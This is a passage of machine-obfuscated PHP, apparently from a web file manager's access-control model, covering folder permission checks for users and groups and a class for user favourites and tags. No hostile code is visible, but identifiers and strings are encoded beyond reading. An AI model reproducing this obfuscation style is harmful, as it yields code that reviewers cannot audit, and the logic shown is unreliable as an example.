$a—ğŞËï÷->field($c‹ÄÕî™’¦[2254])->where($c‘œ±Ê™Ò)->select(); $f÷Ş‘—¿•‰ = array_to_keyvalue($f÷Ş‘—¿•‰, $c‹ÄÕî™’¦[377]); } $Eâ‘ÈÆ˜Î‘ = $BÕÕØëùÙÍ; foreach ($f÷Ş‘—¿•‰ as $f˜ÃÀ–“¨Ë => $C»é±³å‚¨) { $A¢Í„…·æ = $a—ğŞËï÷->parentLevelArray($C»é±³å‚¨[$c‹ÄÕî™’¦[467]]); $Eâ‘ÈÆ˜Î‘ = array_merge($Eâ‘ÈÆ˜Î‘, $A¢Í„…·æ, array($f˜ÃÀ–“¨Ë)); } goto F¬š§’øºÌ; cğ–ÅÈ´: } public function authDeepCheck($f±Õñø“èĞ) { goto dô¢óœÊ¥¹; dô¢óœÊ¥¹: $a®ïÄ£ÛÁ =& $_SERVER[©]; if (_get($GLOBALS, $a®ïÄ£ÛÁ[465])) { return !1; } $aš„÷Œ–ñ = $this->makeAuthDeep(); goto d˜¡¥„…øò; d˜¡¥„…øò: if (!in_array($f±Õñø“èĞ, $aš„÷Œ–ñ[$a®ïÄ£ÛÁ[2256]])) { return !1; } $Dğª‡»‡¤– = array(); foreach ($aš„÷Œ–ñ[$a®ïÄ£ÛÁ[2257]] as $C¬ÍÂÉ»Ç« => $fØ¿ŠÚ˜•Ü) { if (!in_array($f±Õñø“èĞ, $fØ¿ŠÚ˜•Ü)) { continue; } $Dğª‡»‡¤–[] = $C¬ÍÂÉ»Ç«; } goto A“Ï‚îâÛÙ; A“Ï‚îâÛÙ: $E®Ğ¯Ğ›ç§ = $Dğª‡»‡¤– ? $Dğª‡»‡¤–[0] : $f±Õñø“èĞ; return array($a®ïÄ£ÛÁ[385] => -1, $a®ïÄ£ÛÁ[426] => array($a®ïÄ£ÛÁ[393] => $a®ïÄ£ÛÁ[1028], $a®ïÄ£ÛÁ[2108] => $a®ïÄ£ÛÁ[476], $a®ïÄ£ÛÁ[394] => LNG($a®ïÄ£ÛÁ[2258]), $a®ïÄ£ÛÁ[2120] => $a®ïÄ£ÛÁ[2259]), $a®ïÄ£ÛÁ[2260] => array($a®ïÄ£ÛÁ[396] => $a®ïÄ£ÛÁ[2261], $a®ïÄ£ÛÁ[85] => $E®Ğ¯Ğ›ç§)); goto C©ó’¯áÔ; C©ó’¯áÔ: } protected function makeAuthDeep() { goto Fˆ¶£¿’ÑÁ; Fˆ¶£¿’ÑÁ: $F‰´Åİ =& $_SERVER[©]; static $AŞÑßÃ½Ğ­ = false; if ($AŞÑßÃ½Ğ­) { return $AŞÑßÃ½Ğ­; } goto cÖ¾³·çá; FĞíÒ›â‚: if ($CÛâ¾¿) { $Dñ¼šß¡ = array(array($F‰´Åİ[379] => SourceModel::TYPE_USER, $F‰´Åİ[464] => USER_ID), array($F‰´Åİ[379] => SourceModel::TYPE_GROUP, $F‰´Åİ[464] => array($F‰´Åİ[392], $CÛâ¾¿)), $F‰´Åİ[911] => $F‰´Åİ[2184]); } if ($FˆÑĞïŒ®) { $Dñ¼šß¡ = array($Dñ¼šß¡, $F‰´Åİ[2233] => array($F‰´Åİ[2263], $FˆÑĞïŒ®)); } $cáòœ•åãŒ = $this->field($F‰´Åİ[2264])->where($Dñ¼šß¡)->select(); goto c»£±¶¤Œ; c»£±¶¤Œ: $Fß÷¯´°ßÁ = array_to_keyvalue($cáòœ•åãŒ, $F‰´Åİ[43], $F‰´Åİ[377]); $C–Ïè‹ ¾Ò = array(); $d ›÷²‰– = $CÛâ¾¿; goto a…‘‹º™ñö; A¦îëöœù×: $CÛâ¾¿ = Session::get($F‰´Åİ[2217]); $CÛâ¾¿ = array_to_keyvalue($CÛâ¾¿, $F‰´Åİ[43], $F‰´Åİ[2102]); $Dñ¼šß¡ = array($F‰´Åİ[379] => SourceModel::TYPE_USER, $F‰´Åİ[464] => USER_ID); goto FĞíÒ›â‚; aŞ²ğ½™ô: return $AŞÑßÃ½Ğ­; goto D¯¶Ä˜™÷×; dË“ÂÙ ƒÓ: foreach ($Cëù…¬¹» as $eÕË“…Ù¹š => $C©Î¶˜¥ï„) { $FÁ‹ÊÔŞò = $bâ¯™â§Ê[$eÕË“…Ù¹š]; if (!$FÁ‹ÊÔŞò || !$bï³™­À†[$FÁ‹ÊÔŞò]) { continue; } $Aäß”Š…Ÿ  = array(); foreach ($B‹ÃŞõ¦ÓŠ[$FÁ‹ÊÔŞò] as $DíÁµ¨»Ğ) { $Aäß”Š…Ÿ [] = $bï³™­À†[$DíÁµ¨»Ğ]; } $Cëù…¬¹»[$eÕË“…Ù¹š] = array_merge($Aäß”Š…Ÿ , $C©Î¶˜¥ï„); } $C–Ïè‹ ¾Ò = array_values(array_unique($C–Ïè‹ ¾Ò)); $AŞÑßÃ½Ğ­ = array($F‰´Åİ[2256] => $C–Ïè‹ ¾Ò, $F‰´Åİ[2257] => $Cëù…¬¹»); goto aŞ²ğ½™ô; CŞ‚•ĞÛÙ: foreach ($CÈ‡±¾¼Ü as $DíÁµ¨»Ğ) { $BĞ·´ºÔ¨½ = $BªÒ—§¯Òİ->getInfo($DíÁµ¨»Ğ); $AÖ„×ŸÍßî = $cå¿ŸŠÂ‘·->parentLevelArray($BĞ·´ºÔ¨½[$F‰´Åİ[467]]); $d ›÷²‰– = array_merge($d ›÷²‰–, $AÖ„×ŸÍßî); } $d ›÷²‰– = array_values(array_unique($d ›÷²‰–)); foreach ($d ›÷²‰– as $DíÁµ¨»Ğ) { $BĞ·´ºÔ¨½ = $BªÒ—§¯Òİ->getInfo($DíÁµ¨»Ğ); $C–Ïè‹ ¾Ò[] = $BĞ·´ºÔ¨½[$F‰´Åİ[399]][$F‰´Åİ[377]]; $bï³™­À†[$DíÁµ¨»Ğ] = $BĞ·´ºÔ¨½[$F‰´Åİ[399]][$F‰´Åİ[377]]; $B‹ÃŞõ¦ÓŠ[$DíÁµ¨»Ğ] = $cå¿ŸŠÂ‘·->parentLevelArray($BĞ·´ºÔ¨½[$F‰´Åİ[467]]); } goto dË“ÂÙ ƒÓ; cÖ¾³·çá: $B—¢º­İ = Model($F‰´Åİ[2262])->listData(); $FˆÑĞïŒ® = array(); foreach ($B—¢º­İ as $cÁïÏÙ®‘“) { if ($cÁïÏÙ®‘“[$F‰´Åİ[384]] == 0 && $cÁïÏÙ®‘“[$F‰´Åİ[2122]] == $F‰´Åİ[93]) { $FˆÑĞïŒ®[] = $cÁïÏÙ®‘“[$F‰´Åİ[375]]; } } goto A¦îëöœù×; a…‘‹º™ñö: $cå¿ŸŠÂ‘· = Model($F‰´Åİ[1114]); $BªÒ—§¯Òİ = Model($F‰´Åİ[466]); $Cëù…¬¹» = array(); goto D³£Äö–²; BÆÀÌÊ¥: if ($Fß÷¯´°ßÁ) { $eÑÅ³¡ƒ½Ó = $cå¿ŸŠÂ‘·->where(array($F‰´Åİ[377] => array($F‰´Åİ[392], $Fß÷¯´°ßÁ)))->select(); foreach ($eÑÅ³¡ƒ½Ó as $A´êÂéèó) { $AÖ„×ŸÍßî = $cå¿ŸŠÂ‘·->parentLevelArray($A´êÂéèó[$F‰´Åİ[467]]); $C–Ïè‹ ¾Ò = array_merge($C–Ïè‹ ¾Ò, $AÖ„×ŸÍßî); $d ›÷²‰–[] = $A´êÂéèó[$F‰´Åİ[464]]; $Cëù…¬¹»[$A´êÂéèó[$F‰´Åİ[377]]] = $AÖ„×ŸÍßî; $bâ¯™â§Ê[$A´êÂéèó[$F‰´Åİ[377]]] = $A´êÂéèó[$F‰´Åİ[464]]; } } $d ›÷²‰– = array_values(array_unique($d ›÷²‰–)); $CÈ‡±¾¼Ü = $d ›÷²‰–; goto CŞ‚•ĞÛÙ; D³£Äö–²: $bâ¯™â§Ê = array(); $bï³™­À† = array(); $B‹ÃŞõ¦ÓŠ = array(); goto BÆÀÌÊ¥; D¯¶Ä˜™÷×: } private function makeSourceAuth($D’´œŠ¦–, $d•‹ãæÉá‰) { goto E˜»«È÷àç; E˜»«È÷àç: $bŸæš½…ÙÅ =& $_SERVER[©]; $c¶ßŞ®öÌ‡ = Session::get($bŸæš½…ÙÅ[2217]); $c¶ßŞ®öÌ‡ = array_to_keyvalue($c¶ßŞ®öÌ‡, $bŸæš½…ÙÅ[2102]); goto b“†ê¹“§•; cïïÎ¦£Œ: $a½©­¤…¼… = !1; foreach ($Bß˜„ÔÒÉ as $Fâ•¶°«Øô) { if (!isset($d•‹ãæÉá‰[$Fâ•¶°«Øô])) { continue; } $dèÙÖÖ¢Ö = $this->authMake($d•‹ãæÉá‰[$Fâ•¶°«Øô]); if ($dèÙÖÖ¢Ö[$bŸæš½…ÙÅ[426]]) { $a½©­¤…¼… = $dèÙÖÖ¢Ö; break; } } if (!$bÏá¤øÖÍÜ) { return $a½©­¤…¼…; } goto C¯äÓÈ×êƒ; dçÜ¿Â‘: return $a½©­¤…¼…; goto AöĞòë¼Ç‡; C¯äÓÈ×êƒ: if (!$a½©­¤…¼… && isset($c¶ßŞ®öÌ‡[$Fáì·äâ])) { $aÜ¯‡¬Şã» = $c¶ßŞ®öÌ‡[$Fáì·äâ]; $BŠ©Ûá†¥ò = Model($bŸæš½…ÙÅ[466])->getInfo($Fáì·äâ); $a½©­¤…¼… = array($bŸæš½…ÙÅ[2265] => intval($aÜ¯‡¬Şã»[$bŸæš½…ÙÅ[384]][$bŸæš½…ÙÅ[384]]), $bŸæš½…ÙÅ[2266] => $aÜ¯‡¬Şã»[$bŸæš½…ÙÅ[384]], $bŸæš½…ÙÅ[2260] => array($bŸæš½…ÙÅ[396] => $bŸæš½…ÙÅ[2270], $bŸæš½…ÙÅ[85] => $BŠ©Ûá†¥ò[$bŸæš½…ÙÅ[399]][$bŸæš½…ÙÅ[377]], $bŸæš½…ÙÅ[2269] => $BŠ©Ûá†¥ò[$bŸæš½…ÙÅ[471]])); } if (!$a½©­¤…¼…) { $BŠ©Ûá†¥ò = Model($bŸæš½…ÙÅ[466])->getInfo($Fáì·äâ); $aÔ½Ê¸•¼Ì = explode($bŸæš½…ÙÅ[57], trim($BŠ©Ûá†¥ò[$bŸæš½…ÙÅ[467]], $bŸæš½…ÙÅ[57])); foreach ($aÔ½Ê¸•¼Ì as $Eğ­À¢¿) { if ($Eğ­À¢¿ == $bŸæš½…ÙÅ[476] || $Eğ­À¢¿ == $d¡¨œàîà–) { continue; } if (!isset($c¶ßŞ®öÌ‡[$Eğ­À¢¿])) { continue; } $aÜ¯‡¬Şã» = $c¶ßŞ®öÌ‡[$Eğ­À¢¿]; $a½©­¤…¼… = array($bŸæš½…ÙÅ[2265] => intval($aÜ¯‡¬Şã»[$bŸæš½…ÙÅ[384]][$bŸæš½…ÙÅ[384]]), $bŸæš½…ÙÅ[2266] => $aÜ¯‡¬Şã»[$bŸæš½…ÙÅ[384]], $bŸæš½…ÙÅ[2260] => array($bŸæš½…ÙÅ[396] => $bŸæš½…ÙÅ[2267], $bŸæš½…ÙÅ[2268] => $BŠ©Ûá†¥ò[$bŸæš½…ÙÅ[399]][$bŸæš½…ÙÅ[377]], $bŸæš½…ÙÅ[2269] => $BŠ©Ûá†¥ò[$bŸæš½…ÙÅ[471]])); break; } } if (!$a½©­¤…¼… || $a½©­¤…¼…[$bŸæš½…ÙÅ[385]] <= 0) { $aÎŸ›î—Ê = $this->authDeepCheck($D’´œŠ¦–[$bŸæš½…ÙÅ[377]]); if ($aÎŸ›î—Ê) { $a½©­¤…¼… = $aÎŸ›î—Ê; } } goto dçÜ¿Â‘; b“†ê¹“§•: $d¡¨œàîà– = $bŸæš½…ÙÅ[93]; $Bß˜„ÔÒÉ = Model($bŸæš½…ÙÅ[1114])->parentLevelArray($D’´œŠ¦–[$bŸæš½…ÙÅ[467]]); $Bß˜„ÔÒÉ = array_merge(array($D’´œŠ¦–[$bŸæš½…ÙÅ[377]]), array_reverse($Bß˜„ÔÒÉ)); goto CšÜºÍñí; CšÜºÍñí: $Fáì·äâ = $D’´œŠ¦–[$bŸæš½…ÙÅ[464]]; $bÏá¤øÖÍÜ = $D’´œŠ¦–[$bŸæš½…ÙÅ[379]] == SourceModel::TYPE_GROUP; if ($bÏá¤øÖÍÜ && isset($c¶ßŞ®öÌ‡[$Fáì·äâ]) && !_get($GLOBALS, $bŸæš½…ÙÅ[465])) { $aÜ¯‡¬Şã» = $c¶ßŞ®öÌ‡[$Fáì·äâ]; if (Model($bŸæš½…ÙÅ[2252])->authCheckRoot($aÜ¯‡¬Şã»[$bŸæš½…ÙÅ[384]][$bŸæš½…ÙÅ[384]])) { $BŠ©Ûá†¥ò = Model($bŸæš½…ÙÅ[466])->getInfo($Fáì·äâ); $a½©­¤…¼… = array($bŸæš½…ÙÅ[2265] => intval($aÜ¯‡¬Şã»[$bŸæš½…ÙÅ[384]][$bŸæš½…ÙÅ[384]]), $bŸæš½…ÙÅ[2266] => $aÜ¯‡¬Şã»[$bŸæš½…ÙÅ[384]], $bŸæš½…ÙÅ[2260] => array($bŸæš½…ÙÅ[396] => $bŸæš½…ÙÅ[2267], $bŸæš½…ÙÅ[2268] => $BŠ©Ûá†¥ò[$bŸæš½…ÙÅ[399]][$bŸæš½…ÙÅ[377]], $bŸæš½…ÙÅ[2269] => $BŠ©Ûá†¥ò[$bŸæš½…ÙÅ[471]])); return $a½©­¤…¼…; } } goto cïïÎ¦£Œ; AöĞòë¼Ç‡: } public function authOwnerApply($dË‡­—Åß·) { goto D£±·æ…—Ë; aÏø‹—–ë: $dË‡­—Åß·[$CˆïÇÉÈ‚[384]][$CˆïÇÉÈ‚[2273]] = Model($CˆïÇÉÈ‚[482])->userListInfo($Bìõæé‰Ô); return $dË‡­—Åß·; goto fè¶ãÀÚ‚; BéÆŒÌĞæ˜: $dä‹âÖßá = array(); $Bìõæé‰Ô = array(); foreach ($AŞì˜ÉÈ¿ê as $AÄ …‘Ë²à => $Bù™ˆª±æ) { $BŒĞÅñªËø = $this->authFolderOwnerUser($Bù™ˆª±æ); $dä‹âÖßá[$AÄ …‘Ë²à] = $BŒĞÅñªËø; $Bìõæé‰Ô = array_merge($Bìõæé‰Ô, $BŒĞÅñªËø[$CˆïÇÉÈ‚[543]]); if ($BŒĞÅñªËø[$CˆïÇÉÈ‚[2272]]) { break; } } goto eíÂ”²©¿è; a™ ¾¬ë¿: $F‚‡º‹†äÀ = array($CˆïÇÉÈ‚[391] => array($CˆïÇÉÈ‚[392], $Aù’’œ°¸¯)); $AŞì˜ÉÈ¿ê = $this->field($dĞÈóÊ«ˆ)->where($F‚‡º‹†äÀ)->select(); $AŞì˜ÉÈ¿ê = array_to_keyvalue_group($AŞì˜ÉÈ¿ê, $CˆïÇÉÈ‚[377]); goto BéÆŒÌĞæ˜; eíÂ”²©¿è: if (count($Bìõæé‰Ô) == 0) { $Bìõæé‰Ô = $this->authFolderOwnerGroup($dË‡­—Åß·[$CˆïÇÉÈ‚[464]]); } $Bìõæé‰Ô = array_unique($Bìõæé‰Ô); if (AuthModel::authCheckRoot($dË‡­—Åß·[$CˆïÇÉÈ‚[384]][$CˆïÇÉÈ‚[385]])) { $Bìõæé‰Ô[] = USER_ID; } goto aÏø‹—–ë; D£±·æ…—Ë: $CˆïÇÉÈ‚ =& $_SERVER[©]; if (empty($dË‡­—Åß·[$CˆïÇÉÈ‚[384]]) || isset($dË‡­—Åß·[$CˆïÇÉÈ‚[2271]]) && $dË‡­—Åß·[$CˆïÇÉÈ‚[2271]]) { return $dË‡­—Åß·; } if (AuthModel::authCheckRoot($dË‡­—Åß·[$CˆïÇÉÈ‚[384]][$CˆïÇÉÈ‚[385]])) { return $dË‡­—Åß·; } goto bÜÎôë…²; bÜÎôë…²: $Aù’’œ°¸¯ = Model($CˆïÇÉÈ‚[1114])->parentLevelArray($dË‡­—Åß·[$CˆïÇÉÈ‚[467]]); $Aù’’œ°¸¯ = array_merge(array($dË‡­—Åß·[$CˆïÇÉÈ‚[377]]), array_reverse($Aù’’œ°¸¯)); $dĞÈóÊ«ˆ = $CˆïÇÉÈ‚[2255]; goto a™ ¾¬ë¿; fè¶ãÀÚ‚: } private function authFolderOwnerGroup($CÅ»ö‹Ûè) { $A—ßóšŸ÷Ø =& $_SERVER[©]; $bßòÀ±™™æ = Model($A—ßóšŸ÷Ø[2178])->where(array($A—ßóšŸ÷Ø[2102] => $CÅ»ö‹Ûè))->select(); $eÓ«»”ÂÒ· = array(); if (!$bßòÀ±™™æ) { return $eÓ«»”ÂÒ·; } foreach ($bßòÀ±™™æ as $D‹æÕğÜ÷é) { $CÑ×‘à´»Ù = $this->authInfo($D‹æÕğÜ÷é); if (AuthModel::authCheckRoot($CÑ×‘à´»Ù[$A—ßóšŸ÷Ø[384]])) { $eÓ«»”ÂÒ·[] = $D‹æÕğÜ÷é[$A—ßóšŸ÷Ø[1434]]; } } return $eÓ«»”ÂÒ·; } private function authFolderOwnerUser($dÓÊµ²ë™) { $dõÂ¯êò±Ü =& $_SERVER[©]; $F¥ÜñÙ¥­ = array(); $A»Á×Ğ«æÃ = !1; foreach ($dÓÊµ²ë™ as $EêßŞÙİ) { $bĞÉ×ÅÉ = $this->authInfo($EêßŞÙİ); if ($EêßŞÙİ[$dõÂ¯êò±Ü[464]] == $dõÂ¯êò±Ü[476]) { $A»Á×Ğ«æÃ = !0; } if ($EêßŞÙİ[$dõÂ¯êò±Ü[379]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($bĞÉ×ÅÉ[$dõÂ¯êò±Ü[384]])) { $F¥ÜñÙ¥­[] = $EêßŞÙİ[$dõÂ¯êò±Ü[464]]; } } } return array($dõÂ¯êò±Ü[543] => $F¥ÜñÙ¥­, $dõÂ¯êò±Ü[2272] => $A»Á×Ğ«æÃ); } public function authMake($CÕ¶Œ°ÔÅ) { goto b–ù‘¥Šœ; dÔŒ²İÍï: $e™öœ‹²§Ì = 0; $D¸Æ¹±ŞŞ = array($a¬‹ÙÏ·­–[377] => 0); foreach ($CÕ¶Œ°ÔÅ as $D¸Æ¹±ŞŞ) { $b“Ğåğ™é‘ = $this->authInfo($D¸Æ¹±ŞŞ); $f¡ĞåÌìÂ = $D¸Æ¹±ŞŞ[$a¬‹ÙÏ·­–[464]]; $E‚‰ŒŞŞ«† = intval($b“Ğåğ™é‘[$a¬‹ÙÏ·­–[384]]); if ($D¸Æ¹±ŞŞ[$a¬‹ÙÏ·­–[379]] == SourceModel::TYPE_USER && $f¡ĞåÌìÂ == USER_ID) { $FÒ«è÷ÑÜ = !0; $EÖÖÅ–ª½Ÿ = $b“Ğåğ™é‘; $aŒ¨¢ŸŸŒÅ = $E‚‰ŒŞŞ«†; } else { if ($D¸Æ¹±ŞŞ[$a¬‹ÙÏ·­–[379]] == SourceModel::TYPE_GROUP && in_array($f¡ĞåÌìÂ, $A¤Şš÷³ó‹)) { $A„ÒàÕ©Àã = !0; if ($E‚‰ŒŞŞ«† >= $C”Åá†ÏÔÀ) { $C”Åá†ÏÔÀ = $E‚‰ŒŞŞ«†; $d÷¥‚ÍË¹Å = $b“Ğåğ™é‘; } } else { if ($f¡ĞåÌìÂ == $a¬‹ÙÏ·­–[476]) { $e™öœ‹²§Ì = !0; $cŠö®Ô¢È = $b“Ğåğ™é‘; $D«ìÑò÷³ô = $E‚‰ŒŞŞ«†; } } } } goto b‡àÚ‡Š„¢; bì‡‘Ï¶Ê: $cŠö®Ô¢È = 0; $FÒ«è÷ÑÜ = 0; $A„ÒàÕ©Àã = 0; goto dÔŒ²İÍï; D•¤Æí’åœ: $A¤Şš÷³ó‹ = array_to_keyvalue($féï„Ä„ò, $a¬‹ÙÏ·­–[43], $a¬‹ÙÏ·­–[2102]); $aŒ¨¢ŸŸŒÅ = 0; $C”Åá†ÏÔÀ = 0; goto c¨Ï¸¬Îíß; b‡àÚ‡Š„¢: $F©ÛˆÔÓÜ¢ = $FÒ«è÷ÑÜ ? $aŒ¨¢ŸŸŒÅ : ($A„ÒàÕ©Àã ? $C”Åá†ÏÔÀ : $D«ìÑò÷³ô); $b“Ğåğ™é‘ = $FÒ«è÷ÑÜ ? $EÖÖÅ–ª½Ÿ : ($A„ÒàÕ©Àã ? $d÷¥‚ÍË¹Å : $cŠö®Ô¢È); $dµç­ç¥à = $FÒ«è÷ÑÜ ? $a¬‹ÙÏ·­–[2274] : ($A„ÒàÕ©Àã ? $a¬‹ÙÏ·­–[2275] : ($e™öœ‹²§Ì ? $a¬‹ÙÏ·­–[2276] : $a¬‹ÙÏ·­–[13])); goto E÷³Šº÷÷; c¨Ï¸¬Îíß: $D«ìÑò÷³ô = 0; $EÖÖÅ–ª½Ÿ = 0; $d÷¥‚ÍË¹Å = 0; goto bì‡‘Ï¶Ê; b–ù‘¥Šœ: $a¬‹ÙÏ·­– =& $_SERVER[©]; if (!$CÕ¶Œ°ÔÅ) { return array($a¬‹ÙÏ·­–[385] => 0, $a¬‹ÙÏ·­–[426] => !1); } $féï„Ä„ò = Session::get($a¬‹ÙÏ·­–[2217]); goto D•¤Æí’åœ; E÷³Šº÷÷: $bªÅÚÁ‹§ = array($a¬‹ÙÏ·­–[2265] => intval($F©ÛˆÔÓÜ¢), $a¬‹ÙÏ·­–[2266] => $b“Ğåğ™é‘, $a¬‹ÙÏ·­–[2260] => array($a¬‹ÙÏ·­–[396] => $dµç­ç¥à, $a¬‹ÙÏ·­–[85] => $D¸Æ¹±ŞŞ[$a¬‹ÙÏ·­–[377]])); return $bªÅÚÁ‹§; goto Cö©÷½ˆŒ¶; Cö©÷½ˆŒ¶: } public function authTargetInfoMake($f–ØĞä•‡) { goto FÀøëÀİŸ¶; FÀøëÀİŸ¶: $E®£ÎíÂ†„ =& $_SERVER[©]; $aó¦ï½Àİ¦ = array(); $c‹İºäéö• = array(); goto d×Ô£íà‹“; d×Ô£íà‹“: foreach ($f–ØĞä•‡ as $DªŒÌœæ„í) { if ($DªŒÌœæ„í[$E®£ÎíÂ†„[379]] == SourceModel::TYPE_USER) { $aó¦ï½Àİ¦[] = intval($DªŒÌœæ„í[$E®£ÎíÂ†„[464]]); } else { if ($DªŒÌœæ„í[$E®£ÎíÂ†„[379]] == SourceModel::TYPE_GROUP) { $c‹İºäéö•[] = intval($DªŒÌœæ„í[$E®£ÎíÂ†„[464]]); } } } if ($aó¦ï½Àİ¦) { $aó¦ï½Àİ¦ = Model($E®£ÎíÂ†„[482])->userListInfo($aó¦ï½Àİ¦); } if ($c‹İºäéö•) { $b©âÖ·Òİ = array($E®£ÎíÂ†„[2176] => array($E®£ÎíÂ†„[392], $c‹İºäéö•)); $c‹İºäéö• = Model($E®£ÎíÂ†„[466])->field($E®£ÎíÂ†„[2189])->where($b©âÖ·Òİ)->select(); $c‹İºäéö• = array_to_keyvalue($c‹İºäéö•, $E®£ÎíÂ†„[2102]); } goto BËïÚÛçßç; BËïÚÛçßç: return array($E®£ÎíÂ†„[2277] => $aó¦ï½Àİ¦, $E®£ÎíÂ†„[2269] => $c‹İºäéö•); goto Cùñá×ä; Cùñá×ä: } private function authInfo($C²µˆ‰†È‘) { $Eå°áÚˆ‡ =& $_SERVER[©]; if ($C²µˆ‰†È‘[$Eå°áÚˆ‡[2233]]) { $eÏ¨ğŠÖ­® = Model($Eå°áÚˆ‡[2252])->listData($C²µˆ‰†È‘[$Eå°áÚˆ‡[2233]]); if (!$eÏ¨ğŠÖ­®) { return !1; $A¶Ñ”ˆ¡ì = Model($Eå°áÚˆ‡[2252])->listData(); $bŒÙ²ÛÙŒæ = array_filter_by_field($A¶Ñ”ˆ¡ì, $Eå°áÚˆ‡[384], $Eå°áÚˆ‡[476]); return $bŒÙ²ÛÙŒæ; } $FøâÊ•’Ü = array_field_key($eÏ¨ğŠÖ­®, array($Eå°áÚˆ‡[375], $Eå°áÚˆ‡[38], $Eå°áÚˆ‡[384], $Eå°áÚˆ‡[2120], $Eå°áÚˆ‡[2123])); $FøâÊ•’Ü[$Eå°áÚˆ‡[2278]] = $C²µˆ‰†È‘; return $FøâÊ•’Ü; } else { return array($Eå°áÚˆ‡[393] => 0, $Eå°áÚˆ‡[2108] => $C²µˆ‰†È‘[$Eå°áÚˆ‡[2234]], $Eå°áÚˆ‡[394] => $Eå°áÚˆ‡[43], $Eå°áÚˆ‡[2120] => $Eå°áÚˆ‡[2279]); } } } goto bƒÎ Îğª©; b ’¬ó·¤î: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($Fù¬÷¿ŒÉ) { $aÈ†£ŸèÎÃ =& $_SERVER[©]; return array($aÈ†£ŸèÎÃ[2487] => array(USER_ID, $aÈ†£ŸèÎÃ[2542])); } protected function listData() { $Få©Íšö°Ë =& $_SERVER[©]; $F’É¸ª®¤ = array($Få©Íšö°Ë[1425] => USER_ID, $Få©Íšö°Ë[444] => array($Få©Íšö°Ë[2543], 0)); $Eª†«¦”áÖ = $Få©Íšö°Ë[2544]; $AÀØšŒ‚Õ± = $Få©Íšö°Ë[2545]; $dÄì‹Ààñ‘ = $this->field($Eª†«¦”áÖ)->where($F’É¸ª®¤)->order($AÀØšŒ‚Õ±)->select(); return $dÄì‹Ààñ‘ ? $dÄì‹Ààñ‘ : array(); } protected function listByTag($F‡Ï—³ÑàË) { } protected function addToTag($BÚ†¤çÎÓç, $e²¢ˆŸÑª¶) { $døáİŠ²å† =& $_SERVER[©]; if (!Model($døáİŠ²å†[2315])->listData($e²¢ˆŸÑª¶) || !Model($døáİŠ²å†[752])->pathInfo($BÚ†¤çÎÓç)) { return !1; } $f•Ê´Ûí¼ø = array($døáİŠ²å†[1425] => USER_ID, $døáİŠ²å†[444] => $e²¢ˆŸÑª¶, $døáİŠ²å†[395] => $BÚ†¤çÎÓç, $døáİŠ²å†[396] => $døáİŠ²å†[390], $døáİŠ²å†[394] => $døáİŠ²å†[43], $døáİŠ²å†[2106] => 0); if ($this->where($f•Ê´Ûí¼ø)->find()) { return !1; } return $this->add($f•Ê´Ûí¼ø); } protected function removeFromTag($C´ˆ°–ìŠ™, $f¿îàˆƒÉî) { $FÑ’†çÕƒ =& $_SERVER[©]; if (!Model($FÑ’†çÕƒ[2315])->listData($f¿îàˆƒÉî)) { return !1; } if (is_array($C´ˆ°–ìŠ™)) { $C´ˆ°–ìŠ™ = array($FÑ’†çÕƒ[17], $C´ˆ°–ìŠ™); } $B’Ô‘èÀ—— = array($FÑ’†çÕƒ[1425] => USER_ID, $FÑ’†çÕƒ[444] => $f¿îàˆƒÉî, $FÑ’†çÕƒ[396] => $FÑ’†çÕƒ[390], $FÑ’†çÕƒ[395] => $C´ˆ°–ìŠ™); return $this->where($B’Ô‘èÀ——)->delete(); } protected function removeByTag($aÛ’¦ñ¡‹›) { $DÓ †õš¦ã =& $_SERVER[©]; if (!$aÛ’¦ñ¡‹›) { return !1; } $c³†áàÂÁÃ = array($DÓ †õš¦ã[1425] => USER_ID, $DÓ †õš¦ã[444] => $aÛ’¦ñ¡‹›); return $this->where($c³†áàÂÁÃ)->delete(); } protected function removeBySource($eîİäÂ¯íƒ) { $BŸÛçœ„³“ =& $_SERVER[©]; $eÓåÔ©ôÁ¹ = array($BŸÛçœ„³“[1425] => USER_ID, $BŸÛçœ„³“[395] => $eîİäÂ¯íƒ, $BŸÛçœ„³“[444] => array($BŸÛçœ„³“[925], 0)); return $this->where($eÓåÔ©ôÁ¹)->delete(); } }